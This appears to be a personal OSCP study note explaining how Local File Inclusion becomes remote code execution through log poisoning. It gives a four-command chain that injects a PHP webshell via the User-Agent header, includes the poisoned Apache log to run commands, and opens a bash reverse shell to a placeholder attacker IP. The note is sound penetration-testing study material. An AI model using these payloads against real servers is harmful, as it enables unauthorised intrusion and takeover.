---
title: "LFI to RCE — Log Poisoning Pattern"
created: "2026-04-04"
type: permanent-note
status: active
tags:
  - permanent-note
  - lfi
  - rce
  - log-poisoning
  - web-attacks
  - oscp
---

# LFI to RCE — Log Poisoning Pattern

**Core idea:** Log files record user-controlled input (like User-Agent). If you can write PHP code into a log file and then include that log file via LFI, the PHP code executes — giving you RCE from what started as a read-only file inclusion vulnerability.

---

## Why This Is Powerful

Most people see "Local File Inclusion" and think "file reader." The real insight is that **any file the web server can read that contains your PHP code will execute when included**. Log files are writable by user input — making them the perfect payload delivery vehicle.

The chain is:
```
Control User-Agent → Write PHP to log → LFI includes log → PHP executes → RCE
```

---

## The Three Prerequisites

1. **LFI exists** — a parameter that includes local files and executes PHP
2. **Log file is readable** — web server user (`www-data`) can read the log
3. **Log records user-controlled input** — User-Agent, username, Referer, etc.

---

## Log Files Worth Targeting

| File | Controllable Input | Notes |
|------|-------------------|-------|
| `/var/log/apache2/access.log` | User-Agent, Referer | Most common target |
| `/var/log/nginx/access.log` | User-Agent | Same idea, Nginx |
| `/var/log/vsftpd.log` | FTP username | Send PHP as username |
| `/var/log/ssh/auth.log` | SSH username | Send PHP as SSH username |
| `/proc/self/environ` | User-Agent (HTTP_USER_AGENT) | Direct env vars |
| `C:\xampp\apache\logs\access.log` | User-Agent | Windows XAMPP |

---

## The Attack in 4 Commands

```bash
# 1. Confirm log access via LFI
curl "http://target/index.php?page=../../../../../var/log/apache2/access.log"

# 2. Poison the log (inject PHP webshell into User-Agent)
# In Burp Repeater → change User-Agent to:
#   <?php echo system($_GET['cmd']); ?>
# Then send any request to the target

# 3. Include poisoned log + execute command
curl "http://target/index.php?page=../../../../../var/log/apache2/access.log&cmd=id"

# 4. Upgrade to reverse shell
curl "http://target/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%22"
```

---

## Difference from Directory Traversal

- **Dir Traversal:** `?page=../etc/passwd` → sees PHP source code as text
- **LFI:** `?page=../etc/passwd` → same, BUT if the file contains PHP → it **executes**

That's why log poisoning works: you're not reading the log, you're **executing** it.

---

## Connections

- [[PWK-Module-09-Common-Web-App-Attacks]] — full module with all commands
- PHP Wrappers are an alternative path when you can't access log files:
  - `php://filter` → read PHP source (find hardcoded credentials)
  - `data://` → inject PHP directly in URL (needs `allow_url_include=On`)
- RFI is the remote equivalent — serve your webshell via HTTP instead of writing to logs

---

*From: PWK Module 09, pages 254-259*
